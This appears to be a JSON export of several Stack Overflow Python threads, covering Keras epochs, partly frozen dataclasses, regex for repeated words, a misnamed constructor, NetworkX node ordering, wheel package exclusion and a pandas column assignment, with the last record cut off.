[{"tags": ["python", "tensorflow", "keras"], "answers": [{"comments": [{"owner": {"reputation": 309, "user_id": 5441518, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4e74e12d37cc1d3cb21feeb671e6bb38?s=128&d=identicon&r=PG&f=1", "display_name": "iteal", "link": "https://stackoverflow.com/users/5441518/iteal"}, "edited": false, "score": 0, "creation_date": 1571889220, "post_id": 58532439, "comment_id": 103390850, "body": "Ok but I don&#39;t have a number for &quot;all samples&quot; in my case. There is no end to this dataset."}, {"owner": {"reputation": 141, "user_id": 9342787, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27106be98ef88a5f7904a7c371818e59?s=128&d=identicon&r=PG&f=1", "display_name": "user9342787", "link": "https://stackoverflow.com/users/9342787/user9342787"}, "edited": false, "score": 1, "creation_date": 1571897567, "post_id": 58532439, "comment_id": 103393101, "body": "Training time is finit. Thus, even if your dataset Is generated on the fly you have to decide how many batches to include in an epoch and how many epoch to include in your training. How big these two numbers are it&#39;s up to you, your patience and your computing power."}], "tags": [], "owner": {"reputation": 107, "user_id": 8188139, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3ae98c3ea21ac93efcff7357386d098a?s=128&d=identicon&r=PG&f=1", "display_name": "AyiFF", "link": "https://stackoverflow.com/users/8188139/ayiff"}, "is_accepted": false, "score": -1, "last_activity_date": 1571901224, "last_edit_date": 1571901224, "creation_date": 1571875644, "answer_id": 58532439, "question_id": 58532394, "link": "https://stackoverflow.com/questions/58532394/updating-to-tensorflow-2-0-concept-of-epoch-in-keras/58532439#58532439", "title": "Updating to tensorflow 2.0 : concept of epoch in keras", "body": "<p>Below are common definitions that are necessary to know and understand to correctly utilize Keras:</p>\n\n<hr>\n\n<ol>\n<li>Sample: one element of a dataset.</li>\n<li>Batch: a set of N samples. </li>\n<li>epochs\uff1aNumber of times all samples were trained.</li>\n<li>steps_per_epoch\uff1aSteps here equal to splited batches_number. In\naddition, it is worth mentioning that the batch size !=\nbatches_number\uff0cbatch size is traning sample_number of one step.</li>\n</ol>\n\n<p>Answer your additional comments\uff1a</p>\n\n<hr>\n\n<p>The keras model does not care about the sample length. For example, a model can receive an input tensor of similar (None, w, h, c) shape. The None of the 0-axis is the question of #samples you care about, but you don't need to care. </p>\n\n<p><strong>So no need to specify sample size for Input tensor in keras.</strong></p>\n\n<p>In addition, the sample data collection process can be dynamic, but the samples used for analysis are always fixed. You need to divide the development set and test set. The newly collected samples should be added to the development set and test set in a certain period of time, such as a week or a month, and need to ensure that the collected samples meet the same distribution.</p>\n\n<p>Read about <a href=\"https://github.com/keras-team/keras/blob/master/keras/engine/input_layer.py#L114\" rel=\"nofollow noreferrer\">def Input</a> may help you.</p>\n"}, {"tags": [], "owner": {"reputation": 1744, "user_id": 8842694, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-1s4AN1_hjqE/AAAAAAAAAAI/AAAAAAAAAfI/3zXyhP8eIEs/photo.jpg=k-s128", "display_name": "Rishabh Sahrawat", "link": "https://stackoverflow.com/users/8842694/rishabh-sahrawat"}, "is_accepted": false, "score": 0, "last_activity_date": 1571900842, "creation_date": 1571900842, "answer_id": 58535954, "question_id": 58532394, "link": "https://stackoverflow.com/questions/58532394/updating-to-tensorflow-2-0-concept-of-epoch-in-keras/58535954#58535954", "title": "Updating to tensorflow 2.0 : concept of epoch in keras", "body": "<p>There is also a parameter with this exact name, <code>steps_per_epoch</code>, in <code>model.fit()</code> function, which lets you define the number of steps you want to have that is equal to an epoch. Let's say you want to have <code>steps_per_epoch=4</code> meaning <code>4x8 = 32</code>, when batch size is <code>8</code>. 32 meaning here that the model will see 32 samples from the dataset now. </p>\n\n<p>There is also <code>initial_epoch</code> argument which functions exactly as the name says.</p>\n\n<p><code>epochs</code> also exists in <code>.fit()</code> will take total number of epochs you want. SO lets say wyou want to train if for 10 epochs, then for each epoch the model will see 32 image samples and after 10th epoch it will <code>10x32= 320</code></p>\n\n<p>These all functions are defined <a href=\"https://www.tensorflow.org/versions/r2.0/api_docs/python/tf/keras/Sequential#arguments_6\" rel=\"nofollow noreferrer\">here</a>.</p>\n"}], "owner": {"reputation": 309, "user_id": 5441518, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4e74e12d37cc1d3cb21feeb671e6bb38?s=128&d=identicon&r=PG&f=1", "display_name": "iteal", "link": "https://stackoverflow.com/users/5441518/iteal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 179, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1571901224, "creation_date": 1571875175, "question_id": 58532394, "link": "https://stackoverflow.com/questions/58532394/updating-to-tensorflow-2-0-concept-of-epoch-in-keras", "title": "Updating to tensorflow 2.0 : concept of epoch in keras", "body": "<p>I was previously using the Estimator API in tensorflow and using \"max_steps\" which was the number of batches seen during training.\nMy dataset is completely synthetic and infinite, a completely new batch of images is generated on the fly each time.\nThe new Keras API uses the concept of \"epochs\" which corresponds to an entire pass through a dataset. How do I set \"steps_per_epoch\" and \"initial_Epoch\" and \"epochs\" in the keras \"fit\" function so that it makes sense in my case?</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["python", "immutability", "python-3.7", "mutable", "python-dataclasses"], "comments": [{"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1571877137, "post_id": 58532383, "comment_id": 103388678, "body": "IMO it would be very helpful if you added an example along the lines of what you have (possibly with some sample usage) which you don&#39;t think is very readable. This would provide us with a much better idea of what you&#39;re talking about."}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 12265938, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c533ac229bc5c093d5143110c43c8324?s=128&d=identicon&r=PG&f=1", "display_name": "JMB", "link": "https://stackoverflow.com/users/12265938/jmb"}, "edited": false, "score": 0, "creation_date": 1574455344, "post_id": 58628851, "comment_id": 104253366, "body": "Thank you for the reply!! I will give this a shot!"}, {"owner": {"reputation": 10166, "user_id": 962190, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/sxvRS.png?s=128&g=1", "display_name": "Arne", "link": "https://stackoverflow.com/users/962190/arne"}, "reply_to_user": {"reputation": 21, "user_id": 12265938, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c533ac229bc5c093d5143110c43c8324?s=128&d=identicon&r=PG&f=1", "display_name": "JMB", "link": "https://stackoverflow.com/users/12265938/jmb"}, "edited": false, "score": 0, "creation_date": 1574597492, "post_id": 58628851, "comment_id": 104281257, "body": "I hope it&#39;s useful =) Feel free to get back if  something&#39;s not working as expected."}], "tags": [], "owner": {"reputation": 10166, "user_id": 962190, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/sxvRS.png?s=128&g=1", "display_name": "Arne", "link": "https://stackoverflow.com/users/962190/arne"}, "is_accepted": false, "score": 2, "last_activity_date": 1573724282, "last_edit_date": 1573724282, "creation_date": 1572449584, "answer_id": 58628851, "question_id": 58532383, "link": "https://stackoverflow.com/questions/58532383/dataclass-style-object-with-mutable-and-immutable-properties/58628851#58628851", "title": "Dataclass-style object with mutable and immutable properties?", "body": "<p>The normal approach to tuning attribute handling is writing a custom <a href=\"https://docs.python.org/3/reference/datamodel.html#object.__setattr__\" rel=\"nofollow noreferrer\"><code>__setattr__</code></a> method which allows you to override the default behavior for attribute assignments. Unfortunately, that method is also what dataclasses hooks into to enforce the <code>frozen</code> logic, which effectively locks the function from being altered any further by throwing <code>TypeError: Cannot overwrite attribute __setattr__ in class ModifiableConfig</code> as soon as you try to touch it.</p>\n\n<p>As a consequence, there is no straight forward and simple solution to your problem that I can see. Your approach of delegating the mutable parts of a class to an inner object or dictionary is, in my opinion, not bad or un-pythonic at all, but if you're fine with dropping <code>frozen</code> from your requirements list and only want a partly-mutable dataclass, you can try using this bootleg-semi-frozen recipe here that updates the <code>dataclass</code> decorator with a flag <code>semi</code> that you can switch on to get the behavior you described:</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>from dataclasses import dataclass as dc\nfrom traceback import format_stack\n\ndef dataclass(_cls=None, *, init=True, repr=True, eq=True, order=False,\n              unsafe_hash=False, frozen=False, semi=False):\n\n    def wrap(cls):\n        # sanity checks for new kw\n        if semi:\n            if frozen:\n                raise AttributeError(\"Either semi or frozen, not both.\")\n            if cls.__setattr__ != cls.mro()[1].__setattr__:\n                raise AttributeError(\"No touching setattr when using semi!\")\n\n        # run original dataclass decorator\n        dc(cls, init=init, repr=repr, eq=eq, order=order,\n           unsafe_hash=unsafe_hash, frozen=frozen)\n\n        # add semi-frozen logic\n        if semi:\n            def __setattr__(self, key, value):\n                if key in self.__slots__:\n                    caller = format_stack()[-2].rsplit('in ', 1)[1].strip()\n                    if caller != '__init__':\n                        raise TypeError(f\"Attribute '{key}' is immutable!\")\n                super(type(self), self).__setattr__(key, value)\n            cls.__setattr__ = __setattr__\n\n        return cls\n\n    # Handle being called with or without parens\n    if _cls is None:\n        return wrap\n    return wrap(_cls)\n</code></pre>\n\n<p>I'm being brief here and only handle the cases that look like probable shortcomings to me. There are better ways to handle the wrapping so that the internals are more consistent, but it would blow this already complicated snippet up even more.</p>\n\n<p>Given this new <code>dataclass</code> decorator, you can use it like this to define a dataclass with some immutable attributes and some mutable ones:</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>&gt;&gt;&gt; @dataclass(semi=True)\n... class Foo:\n...     # put immutable attributes and __dict__ into slots \n...     __slots__ = ('__dict__', 'x', 'y')\n...     x: int\n...     y: int\n...     z: int\n...\n&gt;&gt;&gt; f = Foo(1, 2, 3)\n&gt;&gt;&gt; f        # prints Foo(x=1, y=2, z=3)\n&gt;&gt;&gt; f.z = 4  # will work\n&gt;&gt;&gt; f.x = 4  # raises TypeError: attribute 'x' is immutable!\n</code></pre>\n\n<p>You don't have to use <code>__slots__</code> to separate the mutable from the immutable part, but it is convenient for a few reasons (such as being a meta-attribute that isn't part of the default dataclass <code>repr</code>) and felt intuitive to me.</p>\n"}], "owner": {"reputation": 21, "user_id": 12265938, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c533ac229bc5c093d5143110c43c8324?s=128&d=identicon&r=PG&f=1", "display_name": "JMB", "link": "https://stackoverflow.com/users/12265938/jmb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1027, "favorite_count": 1, "answer_count": 1, "score": 2, "last_activity_date": 1573724282, "creation_date": 1571875085, "last_edit_date": 1572449784, "question_id": 58532383, "link": "https://stackoverflow.com/questions/58532383/dataclass-style-object-with-mutable-and-immutable-properties", "title": "Dataclass-style object with mutable and immutable properties?", "body": "<p>I have been playing around with dataclasses dynamically loaded with property names from a file and I am unable to find a way to create both 'frozen' and 'non-frozen' properties. I believe dataclasses only allow you to set all properites to frozen or non-frozen.</p>\n\n<p>As of now, I create a frozen dataclass and add a mutable class as one of the properties which I can change as I go but I am not very happy with the readability of this approach.</p>\n\n<p>Is there another pythonic dataclass people would recommend without needing to implement a class with the ability to set mutable/immutable properties?</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>import dataclasses\n\nclass ModifiableConfig:\n    \"\"\"There is stuff in here but you get the picture.\"\"\"\n    ...\n\nconfig_dataclass = dataclasses.make_dataclass(\n    'c',\n    [(x, type(x), v) for x, v in config.items()] + [('var', object, ModifiableConfig())],\n    frozen=True\n)\n</code></pre>\n\n<p>However I would prefer the ability to choose which attributes are frozen and which are not. Making the need of adding an additional class to the dataclass obsolete. It may look like this:</p>\n\n<pre><code>config_dataclass_modifiable = dataclasses.make_dataclass(\n            'c', [(x, type(x), v, True if 'modifiable' in x else False) for x, v in config.items()])\n</code></pre>\n\n<p>Notice the \"True if 'modifiable' in x else False\", I'm not saying this is how I would do it in the end but hopefully this helps understand my question better.</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 43491, "user_id": 4001592, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HWyjo.jpg?s=128&g=1", "display_name": "Dani Mesejo", "link": "https://stackoverflow.com/users/4001592/dani-mesejo"}, "edited": false, "score": 0, "creation_date": 1571875051, "post_id": 58532348, "comment_id": 103388335, "body": "Are the 3 words always surrounded by <code>[]</code>."}], "answers": [{"tags": [], "owner": {"reputation": 144, "user_id": 7853356, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-sZRF2ug_f-c/AAAAAAAAAAI/AAAAAAAAAMw/kf1N4MJ1qzg/photo.jpg?sz=128", "display_name": "SamHDev", "link": "https://stackoverflow.com/users/7853356/samhdev"}, "is_accepted": false, "score": 0, "last_activity_date": 1571875207, "creation_date": 1571875207, "answer_id": 58532398, "question_id": 58532348, "link": "https://stackoverflow.com/questions/58532348/returning-repeated-words-from-a-string/58532398#58532398", "title": "Returning repeated words from a string", "body": "<p>You could try this regex?</p>\n\n<p><code>\\b(\\w+)\\s+\\1\\b</code></p>\n\n<p>as from here <a href=\"https://stackoverflow.com/questions/2823016/regular-expression-for-consecutive-duplicate-words\">Regular Expression For Consecutive Duplicate Words</a></p>\n"}], "owner": {"reputation": 3, "user_id": 12065511, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/71a9fc1f66fdb4e5fadb067e9491aeab?s=128&d=identicon&r=PG&f=1", "display_name": "new_to_python", "link": "https://stackoverflow.com/users/12065511/new-to-python"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 34, "favorite_count": 0, "closed_date": 1571897295, "answer_count": 1, "score": 0, "last_activity_date": 1571875207, "creation_date": 1571874736, "question_id": 58532348, "link": "https://stackoverflow.com/questions/58532348/returning-repeated-words-from-a-string", "closed_reason": "Duplicate", "title": "Returning repeated words from a string", "body": "<p>I have a string: \"Are you ok? [Hello Hello Hello]. Yes I am! [Bye Bye Bye]\" </p>\n\n<p>I need to return ['Hello Hello Hello', 'Bye Bye Bye'] in a list. </p>\n\n<p>Using a regular expression should be the easiest. I have tried findall() but it only returns the first word like Hello and Bye and not the entire string of [Hello Hello Hello] or [Bye Bye Bye]. I have also tried finditer() but that too is returning the only the first world. </p>\n\n<pre><code>text = \"Are you ok? [Hello Hello Hello]. Yes I am! [Bye Bye Bye]\"\ndef find_words(text):\n    p = re.compile(r'(\\w{3,})\\s\\1')\n    for match in p.finditer(text):\n        print(match.groups(0))\n</code></pre>\n\n<p>Expected result ['Hello Hello Hello', 'Bye Bye Bye']\nWhen I run the code I get ['Hello', 'Bye']</p>\n"}, {"tags": ["python", "class", "inheritance"], "answers": [{"comments": [{"owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 0, "creation_date": 1571875401, "post_id": 58532369, "comment_id": 103388402, "body": "@InderjeetSingh If the constructor is not named correctly as <code>__init__</code>, it will not get executed during construction. Fixing the name, will result in the constructor being correctly called and hence <code>battery_size</code> attribute will be correctly assigned and it will be available when you will call <code>.describe_battery()</code>."}], "tags": [], "owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "is_accepted": false, "score": 4, "last_activity_date": 1571874970, "creation_date": 1571874970, "answer_id": 58532369, "question_id": 58532335, "link": "https://stackoverflow.com/questions/58532335/why-does-the-error-say-object-has-no-attribute/58532369#58532369", "title": "Why does the error say Object has no attribute?", "body": "<p>Should be:</p>\n\n<pre><code>class Electric(Car):\n    def __init__(self, make, model, year):\n</code></pre>\n\n<p>with two underscores.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8596384"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "closed_date": 1571877279, "answer_count": 1, "score": 1, "last_activity_date": 1571874970, "creation_date": 1571874566, "last_edit_date": 1571874806, "question_id": 58532335, "link": "https://stackoverflow.com/questions/58532335/why-does-the-error-say-object-has-no-attribute", "closed_reason": "Duplicate", "title": "Why does the error say Object has no attribute?", "body": "<p>I have been over this code many times and i am not able to find out why does the error keep saying </p>\n\n<blockquote>\n<pre><code>    print(\"This car has a \" + str(self.battery_size) + \"-kWh battery.\")\nAttributeError: 'Electric' object has no attribute 'battery_size'\n</code></pre>\n</blockquote>\n\n<pre><code>class Car:\n    def __init__(self, make, model, year):\n        self.make = make\n        self.model = model\n        self.year = year\n        self.odometer_reading = 0\n\n    def get_descriptive_name(self):\n        long_name = str(self.year) +' '+self.make.title()+' ' + self.model.title()\n        return long_name.title()\n\n    def read_odometer(self):\n        print(\"the car ran \" + str(self.odometer_reading) + \" miles \")\n\n    def update_odometer(self, milage):\n        self.odometer_reading += milage\n        print(\"odo meter reading is \"+str(self.odometer_reading))\n\nclass Electric(Car):\n    def _init_(self, make, model, year):\n        super().__init__(make, model, year)\n        self.battery_size = 70\n\n    def describe_battery(self):\n        print(\"This car has a \" + str(self.battery_size) + \"-kWh battery.\")\n\nmy_tesla = Electric('tesla', 'model s', '2016')\nprint(my_tesla.get_descriptive_name())\nmy_tesla.describe_battery()\n</code></pre>\n\n<p>Any help would be greatly appreciated.\nThanks</p>\n"}, {"tags": ["python", "networkx"], "answers": [{"tags": [], "owner": {"reputation": 6945, "user_id": 2912349, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e334f9128613bb74632da336c63ef18f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Brodersen", "link": "https://stackoverflow.com/users/2912349/paul-brodersen"}, "is_accepted": true, "score": 2, "last_activity_date": 1571910966, "creation_date": 1571910966, "answer_id": 58538795, "question_id": 58532333, "link": "https://stackoverflow.com/questions/58532333/networkx-reverse-for-loop-over-nodes/58538795#58538795", "title": "NetworkX reverse for loop over nodes", "body": "<p>You can cast the NodeView object to a list, and then reverse the list. </p>\n\n<pre><code>g = nx.erdos_renyi_graph(100, 0.1)\nnode_list = list(g.nodes())\nreversed_node_list = node_list[::-1]\n</code></pre>\n"}], "owner": {"reputation": 37, "user_id": 6209730, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a3619003f521663f2ed9fe02d89ad54?s=128&d=identicon&r=PG&f=1", "display_name": "R. Yard", "link": "https://stackoverflow.com/users/6209730/r-yard"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 1, "accepted_answer_id": 58538795, "answer_count": 1, "score": 1, "last_activity_date": 1596127781, "creation_date": 1571874537, "last_edit_date": 1596127781, "question_id": 58532333, "link": "https://stackoverflow.com/questions/58532333/networkx-reverse-for-loop-over-nodes", "title": "NetworkX reverse for loop over nodes", "body": "<p>I am using NetworkX to create a DAG (directed acyclic graph). Each node is represented by an int with two different attributes 'operation' and 'reachable'. I am using the following 'for loop' to iterate over the node:</p>\n<pre><code>for nodes in p.nodes(data=True):\n    ...\n</code></pre>\n<p>It goes over each node from the first to the last. In another part of the code, I need to iterate in the other way around, from last to first but I am not able to reverse the object as the type is <code>&lt;class 'networkx.classes.reportviews.NodeDataView'&gt;</code>. How is it possible to reverse the order of the for loop?</p>\n<p>My network looks like this</p>\n<pre><code>[(1, {'operation': &lt;qiskit.dagcircuit.dagnode.DAGNode object at 0x120a394d0&gt;, 'reachable': False}), \n (2, {'operation': &lt;qiskit.dagcircuit.dagnode.DAGNode object at 0x120a39490&gt;, 'reachable': False}),\n ..., \n (12, {'operation': &lt;qiskit.dagcircuit.dagnode.DAGNode object at 0x120a44250&gt;, 'reachable': True})]\n</code></pre>\n"}, {"tags": ["python", "python-3.x", "pip", "python-wheel"], "comments": [{"owner": {"reputation": 43423, "user_id": 1011724, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/2JAXi.jpg?s=128&g=1", "display_name": "Dan", "link": "https://stackoverflow.com/users/1011724/dan"}, "edited": false, "score": 0, "creation_date": 1571875034, "post_id": 58532323, "comment_id": 103388329, "body": "Can&#39;t you put private outside of <code>mylib</code>? Either you import from it into public and common, in which case you&#39;ll need it in the wheel, or you don&#39;t in which cae why is it in mylib?"}, {"owner": {"reputation": 12945, "user_id": 2246488, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/7f300ea1293fd5e1b95783b6511d5a13?s=128&d=identicon&r=PG&f=1", "display_name": "James Wierzba", "link": "https://stackoverflow.com/users/2246488/james-wierzba"}, "reply_to_user": {"reputation": 43423, "user_id": 1011724, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/2JAXi.jpg?s=128&g=1", "display_name": "Dan", "link": "https://stackoverflow.com/users/1011724/dan"}, "edited": false, "score": 0, "creation_date": 1571876241, "post_id": 58532323, "comment_id": 103388521, "body": "@Dan because I am shipping code to two different audiences. And the public audience cannot have the private code. This is a very minified and simplified example, the actual code base is large. Another alternative would be to decouple the common code into it&#39;s own package, but that isn&#39;t feasible right now. So I want a file path exclusion solution."}], "answers": [{"comments": [{"owner": {"reputation": 12945, "user_id": 2246488, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/7f300ea1293fd5e1b95783b6511d5a13?s=128&d=identicon&r=PG&f=1", "display_name": "James Wierzba", "link": "https://stackoverflow.com/users/2246488/james-wierzba"}, "edited": false, "score": 0, "creation_date": 1571931520, "post_id": 58532614, "comment_id": 103410832, "body": "This does not work, I am still able to import <code>mylib.private</code>. In case it was due to something getting cached, I made sure to rebuild it completely clean. No luck."}, {"owner": {"reputation": 263603, "user_id": 674039, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/leoFi.gif?s=128&g=1", "display_name": "wim", "link": "https://stackoverflow.com/users/674039/wim"}, "reply_to_user": {"reputation": 12945, "user_id": 2246488, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/7f300ea1293fd5e1b95783b6511d5a13?s=128&d=identicon&r=PG&f=1", "display_name": "James Wierzba", "link": "https://stackoverflow.com/users/2246488/james-wierzba"}, "edited": false, "score": 0, "creation_date": 1571940202, "post_id": 58532614, "comment_id": 103414674, "body": "It does work, I have verified it by recreating your directory tree and building a package locally. Make sure that you are not simply importing <code>mylib.private</code> from the current working directory, by checking that the <code>mylib.public.__file__</code> is actually the <i>installed</i> code in <code>site-packages</code>. Note that I needed to add an empty <code>mylib&#47;__init__.py</code> file when packaging your code, it was missing in the question (in which case, <code>find_packages</code> would not have found <i>any</i> packages)."}, {"owner": {"reputation": 12945, "user_id": 2246488, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/7f300ea1293fd5e1b95783b6511d5a13?s=128&d=identicon&r=PG&f=1", "display_name": "James Wierzba", "link": "https://stackoverflow.com/users/2246488/james-wierzba"}, "edited": false, "score": 0, "creation_date": 1574631655, "post_id": 58532614, "comment_id": 104290476, "body": "it it indeed working for me now, i must have made a mistake before"}], "tags": [], "owner": {"reputation": 263603, "user_id": 674039, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/leoFi.gif?s=128&g=1", "display_name": "wim", "link": "https://stackoverflow.com/users/674039/wim"}, "is_accepted": true, "score": 1, "last_activity_date": 1571877334, "creation_date": 1571877334, "answer_id": 58532614, "question_id": 58532323, "link": "https://stackoverflow.com/questions/58532323/exclude-a-directory-when-building-python-whl/58532614#58532614", "title": "Exclude a directory when building python .whl?", "body": "<p>You have a simple mistake in the setup script, this line:</p>\n\n<pre><code>packages=setuptools.find_packages(exclude=(\"mylib/private\",)), \n</code></pre>\n\n<p>Should be:</p>\n\n<pre><code>packages=setuptools.find_packages(exclude=(\"mylib.private\",)), \n</code></pre>\n\n<p>i.e. excluding the package name, not the filesystem path.</p>\n"}], "owner": {"reputation": 12945, "user_id": 2246488, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/7f300ea1293fd5e1b95783b6511d5a13?s=128&d=identicon&r=PG&f=1", "display_name": "James Wierzba", "link": "https://stackoverflow.com/users/2246488/james-wierzba"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 306, "favorite_count": 0, "accepted_answer_id": 58532614, "answer_count": 1, "score": 1, "last_activity_date": 1586806485, "creation_date": 1571874434, "last_edit_date": 1586806485, "question_id": 58532323, "link": "https://stackoverflow.com/questions/58532323/exclude-a-directory-when-building-python-whl", "title": "Exclude a directory when building python .whl?", "body": "<p>Given a Python code base with 3 subdirectories: common, private, public, how do I build a Python wheel file that excludes one of the directories?</p>\n\n<p>Specifically, I want to build a wheel file that includes <code>common</code> and <code>public</code> but excludes <code>private</code></p>\n\n<p>I have following setup:</p>\n\n<pre><code>mypackage/\n    mylib/\n        common/\n            __init__.py\n           ... common code ...\n        private/\n            __init__.py\n            ... private code ...\n        public/\n            __init__.py\n            ... public code ...\n    setup_public.py\n    setup_private.py\n</code></pre>\n\n<p>My <code>setup_public.py</code> looks like this:</p>\n\n<pre><code>imoprt setuptools\n\nsetuptools.setup(\n    name=\"public\",\n    version=\"0.1.0\",\n    author=\"james\",\n    description=\"public pkg\",\n    packages=setuptools.find_packages(exclude=(\"mylib/private\",)), \n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n    ],\n)\n</code></pre>\n\n<p>When I build the package and install it:</p>\n\n<pre><code>python3 setup_public.py sdist bdist_wheel\npip3 install dist/public-0.1.0-py3-none-any.whl\n</code></pre>\n\n<p>And then check to verify the public directory is excluded, I find it is still there:</p>\n\n<pre><code>python3\n\n# works, as expected\n&gt;&gt;&gt; import mylib.public \n\n# also works, unexpected! i do not want to expose this code\n&gt;&gt;&gt; import mylib.private\n</code></pre>\n\n<p>Separating the code into 3 distinct packages isn't an option here for technical reasons, so I am seeking a solution that will let me configure setuptools to ignore a folder.</p>\n"}, {"tags": ["python", "pandas"], "comments": [{"owner": {"reputation": 47817, "user_id": 2535611, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/d61593cac94336661b986823abb9852e?s=128&d=identicon&r=PG", "display_name": "rafaelc", "link": "https://stackoverflow.com/users/2535611/rafaelc"}, "edited": false, "score": 0, "creation_date": 1571874677, "post_id": 58532312, "comment_id": 103388271, "body": "Don&#39;t post your dataframe as images, but rather text. I&#39;ve edited the post to show you how to do it, please follow this pattern in new posts :)"}, {"owner": {"reputation": 43491, "user_id": 4001592, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HWyjo.jpg?s=128&g=1", "display_name": "Dani Mesejo", "link": "https://stackoverflow.com/users/4001592/dani-mesejo"}, "edited": false, "score": 0, "creation_date": 1571874845, "post_id": 58532312, "comment_id": 103388296, "body": "What happens if df2 have more than one value?"}, {"owner": {"reputation": 33, "user_id": 12264599, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6ca55b721aa3a12a7168881b3f909f1b?s=128&d=identicon&r=PG&f=1", "display_name": "Kalyan T", "link": "https://stackoverflow.com/users/12264599/kalyan-t"}, "edited": false, "score": 0, "creation_date": 1571875054, "post_id": 58532312, "comment_id": 103388337, "body": "df2 has only one value and i need to copy the same to all rows in df1"}], "answers": [{"tags": [], "owner": {"reputation": 836, "user_id": 6513736, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-ZxjwktjL3L4/AAAAAAAAAAI/AAAAAAAAA_g/unL96MVy8uY/photo.jpg?sz=128", "display_name": "Carolyn Conway", "link": "https://stackoverflow.com/users/6513736/carolyn-conway"}, "is_accepted": false, "score": 0, "last_activity_date": 1571964883, "creation_date": 1571964883, "answer_id": 58550858, "question_id": 58532312, "link": "https://stackoverflow.com/questions/58532312/how-to-concat-two-csv-files-using-pandas-when-there-is-no-common-column/58550858#58550858", "title": "How to concat two CSV files using Pandas when there is no common column", "body": "<p>To be honest it's not clear to me why you would be storing a single row of data in a CSV file. I'm giving this answer under a couple of assumptions:</p>\n\n<ol>\n<li>You don't have control over how the data is stored.</li>\n<li>There will only ever be 1 row of data in the second CSV, as you indicated above.</li>\n</ol>\n\n<p>Given those assumptions, <code>pd.concat</code> is not really the right tool for this job. If <code>df2</code> always has only a single row, you're better off using simple assignment rather than trying to concatenate.</p>\n\n<p>If you've got a single column with a single row, this would work:</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>df1['Dept'] = df2['Dept'].iloc[0]\n</code></pre>\n\n<p>If you have multiple columns but only a single row, you can do this in a loop:</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>for column in df2.columns:\n    df1[column] = df2[column].iloc[0]\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 12264599, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6ca55b721aa3a12a7168881b3f909f1b?s=128&d=identicon&r=PG&f=1", "display_name": "Kalyan T", "link": "https://stackoverflow.com/users/12264599/kalyan-t"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 77, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1571964883, "creation_date": 1571874344, "last_edit_date": 1571874658, "question_id": 58532312, "link": "https://stackoverflow.com/questions/58532312/how-to-concat-two-csv-files-using-pandas-when-there-is-no-common-column", 